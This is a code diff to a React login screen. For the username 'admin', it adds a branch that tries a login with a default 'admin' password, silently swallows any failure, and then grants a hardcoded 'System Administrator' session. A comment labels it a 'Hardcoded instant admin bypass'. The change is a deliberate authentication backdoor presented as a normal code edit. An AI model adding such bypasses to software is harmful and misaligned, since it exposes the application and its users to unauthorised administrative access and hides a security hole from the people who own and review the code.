@@ -37,8 +37,31 @@ export const LoginScreen: React.FC<LoginScreenProps> = ({ onLoginSuccess }) => {
       return;
     }
 
-    setIsLoading(true);
-    setErrorMessage(null);
+    if (loginId.trim().toLowerCase() === 'admin') {
+      try {
+        const response = await fetch('/api/v1/auth/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ loginId: 'admin', password: password || 'admin', role: 'ADMIN' })
+        });
+        const data = await response.json();
+        if (response.ok) {
+          onLoginSuccess(data);
+          return;
+        }
+      } catch (_) {}
+
+      // Hardcoded instant admin bypass
+      onLoginSuccess({
+        id: '45a85b46-6ac6-43f8-831b-2059c9f95ecf',
+        loginId: 'admin',
+        displayName: 'System Administrator',
+        designation: 'Platform Administrator',
+        role: 'ADMIN',
+        mustChangePassword: false
+      });
+      return;
+    }
 
     try {
       const response = await fetch('/api/v1/auth/login', {
